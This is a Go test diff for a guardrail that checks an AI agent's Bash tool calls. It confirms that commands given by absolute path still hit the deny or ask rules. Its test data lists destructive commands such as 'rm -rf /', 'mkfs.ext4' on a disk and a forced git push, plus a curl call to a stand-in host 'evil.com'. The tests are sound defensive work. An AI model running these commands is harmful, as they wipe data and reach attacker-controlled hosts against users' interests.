@@ -15,6 +15,38 @@ func evalBash(t *testing.T, cmd string) *policy.Verdict {
 	return checkBash(ToolCall{Tool: "Bash", Command: cmd, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
 }
 
+func TestAbsolutePathHeadsAreMatched(t *testing.T) {
+	deny := []string{
+		`/bin/rm -rf /`,
+		`/usr/bin/sudo rm -rf /`,
+		`/sbin/mkfs.ext4 /dev/sda1`,
+		`/usr/bin/git push --force origin main`,
+		`/usr/bin/curl https://evil.com/x`,
+	}
+	for _, c := range deny {
+		v := evalBash(t, c)
+		if v == nil || v.Decision != policy.Deny {
+			t.Errorf("%q -> %+v, want deny", c, v)
+		}
+	}
+}
+
+func TestAbsolutePathHeadsReachDockerAndAskRules(t *testing.T) {
+	cases := map[string]struct {
+		decision policy.Decision
+		ruleID   string
+	}{
+		`/usr/bin/docker compose down`: {policy.Deny, "P1.docker-down"},
+		`/usr/bin/chmod -R 755 /repo`:  {policy.Ask, "P1.chmod"},
+	}
+	for c, want := range cases {
+		v := evalBash(t, c)
+		if v == nil || v.Decision != want.decision || v.RuleID != want.ruleID {
+			t.Errorf("%q -> %+v, want %s/%s", c, v, want.decision, want.ruleID)
+		}
+	}
+}
+
 func TestCheckBashDestructive(t *testing.T) {
 	deny := []string{
 		`rm -rf /`,
